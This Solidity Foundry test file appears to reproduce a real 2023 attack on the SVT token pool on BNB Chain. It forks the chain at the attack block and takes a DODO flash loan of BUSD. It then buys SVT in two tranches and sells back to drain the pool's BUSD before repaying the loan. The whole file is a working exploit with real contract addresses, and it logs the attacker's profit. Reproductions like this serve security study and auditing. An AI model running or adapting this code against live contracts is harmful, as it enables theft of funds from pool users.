// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1695285435671392504?s=20
// @TX
// https://bscscan.com/tx/0xf2a0c957fef493af44f55b201fbc6d82db2e4a045c5c856bfe3d8cb80fa30c12

interface ISVTpool {
    function buy(uint256 amount) external;
    function sell(uint256 amount) external;
}

contract ContractTest is Test {
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 SVT = IERC20(0x657334B4FF7bDC4143941B1F94301f37659c6281);
    ISVTpool pool = ISVTpool(0x2120F8F305347b6aA5E5dBB347230a8234EB3379);
    address dodo = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 31_178_238 - 1);
    }

    function testExploit() public {
        BUSD.approve(address(pool), type(uint256).max);
        SVT.approve(address(pool), type(uint256).max);
        uint256 flash_amount = BUSD.balanceOf(dodo);
        DVM(dodo).flashLoan(0, flash_amount, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] Attacker BUSD balance after exploit", BUSD.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        // Buy SVT with BUSD
        uint256 amount = BUSD.balanceOf(address(this));
        pool.buy(amount / 2);
        uint256 svtBalance1 = SVT.balanceOf(address(this));
        pool.buy(amount - amount / 2);
        uint256 svtBalance2 = SVT.balanceOf(address(this)) - svtBalance1;
        console2.log(svtBalance2);
        console2.log(svtBalance1);
        // Sell SVT for BUSD
        pool.sell(svtBalance2);
        pool.sell(SVT.balanceOf(address(this)) * 62 / 100);

        BUSD.transfer(dodo, quoteAmount);
    }
}
